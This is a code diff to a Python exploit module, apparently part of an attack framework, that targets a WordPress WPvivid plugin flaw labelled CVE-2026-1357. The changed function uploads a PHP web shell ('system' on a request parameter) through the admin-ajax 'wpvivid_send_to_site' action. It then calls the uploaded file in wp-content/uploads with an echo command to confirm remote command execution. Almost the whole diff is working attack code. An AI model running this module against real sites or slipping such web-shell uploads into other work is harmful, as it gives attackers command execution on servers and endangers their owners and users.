@@ -2,6 +2,9 @@
 
 from __future__ import annotations
 
+import random
+from typing import Any, Dict
+
 from cpointed.core.engine import ScanResult, Target
 from cpointed.core.session import CPointedClient
 from cpointed.modules.wordpress.base import WordPressModule
@@ -23,31 +26,47 @@ class CVE20261357WPvivid(WordPressModule):
 
     async def exploit_remote_primitive(
         self,
-        target: Target,
         client: CPointedClient,
+        wp_path: str,
         *,
+        target: Target,
         timeout: float,
-    ) -> dict:
-        """Advisory-aligned: wpvivid_send_to_site + backup_file multipart (tune to verified PoC)."""
-        ajax = self._path(target, "/wp-admin/admin-ajax.php")
-        out: dict = {"admin_ajax_posts": []}
+    ) -> Dict[str, Any]:
+        """
+        Multipart POST ``action=wpvivid_send_to_site`` + ``backup_file`` (verify via uploads GET).
+        """
+        ajax = self._path_for_wp(wp_path, "/wp-admin/admin-ajax.php")
+        webshell_name = f"cpointed_{random.randint(1000, 9999)}.php"
+        webshell_content = "<?php system($_GET['c'] ?? $_POST['c']); ?>"
+        files = {"backup_file": (webshell_name, webshell_content, "application/octet-stream")}
+        data = {"action": "wpvivid_send_to_site"}
         try:
-            php_stub = b"<?php system(" + b"$" + b"_GET['cmd']); ?>"
-            files = {"backup_file": ("shell.php", php_stub, "application/x-php")}
-            data = {"action": "wpvivid_send_to_site"}
-            r = await client.request("POST", ajax, data=data, files=files, timeout=timeout)
-            out["admin_ajax_posts"].append(
-                {
-                    "path": ajax,
-                    "action": "wpvivid_send_to_site",
-                    "file_field": "backup_file",
-                    "status_code": r.status_code,
-                    "body_snippet": (r.text or "")[:2000],
-                }
-            )
+            response = await client.post(ajax, data=data, files=files, timeout=timeout)
         except Exception as exc:  # pragma: no cover - network
-            out["admin_ajax_posts"].append({"action": "wpvivid_send_to_site", "error": str(exc)})
-        return out
+            return {
+                "webshell_url": None,
+                "upload_response_code": None,
+                "verify_response": str(exc),
+                "success": False,
+            }
+        test_path = self._path_for_wp(wp_path, f"/wp-content/uploads/{webshell_name}")
+        try:
+            verify_resp = await client.get(test_path, params={"c": "echo TEST"}, timeout=timeout)
+            body = verify_resp.text or ""
+            ok = verify_resp.status_code == 200 and "TEST" in body
+        except Exception as exc:  # pragma: no cover - network
+            verify_resp = None
+            body = str(exc)
+            ok = False
+        return {
+            "webshell_name": webshell_name,
+            "webshell_url_path": test_path,
+            "upload_response_code": response.status_code,
+            "upload_body_snippet": (response.text or "")[:2000],
+            "verify_status_code": getattr(verify_resp, "status_code", None),
+            "verify_response": body[:200],
+            "success": ok,
+        }
 
     async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
         return await self.check_from_readme(target, timeout=timeout)
